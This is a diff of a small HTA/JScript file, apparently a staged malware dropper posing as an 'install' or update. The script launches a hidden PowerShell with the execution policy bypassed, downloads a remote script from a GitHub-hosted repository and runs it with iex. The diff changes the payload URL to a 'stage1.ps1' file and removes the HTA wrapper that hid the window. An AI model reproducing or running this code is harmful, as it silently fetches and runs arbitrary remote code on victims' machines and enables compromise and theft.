@@ -1,13 +1,6 @@
-<html>
-<head>
-<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="install"
-              WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"/>
 <script language="JScript">
     var shell = new ActiveXObject("WScript.Shell");
-    var cmd = "powershell -w hidden -nop -ep bypass -c \"$u='https://cdn.jsdelivr.net/gh/beamer123q-svg/update-test@main/runtime.ps1';$b=(New-Object Net.WebClient).DownloadString($u);iex $b\"";
+    var cmd = "powershell -w hidden -nop -ep bypass -c \"$u='https://raw.githubusercontent.com/beamer123q-svg/update-test/main/stage1.ps1';$b=(New-Object Net.WebClient).DownloadString($u);iex $b\"";
     shell.Run(cmd, 0, false);
     window.close();
 </script>
-</head>
-<body></body>
-</html>
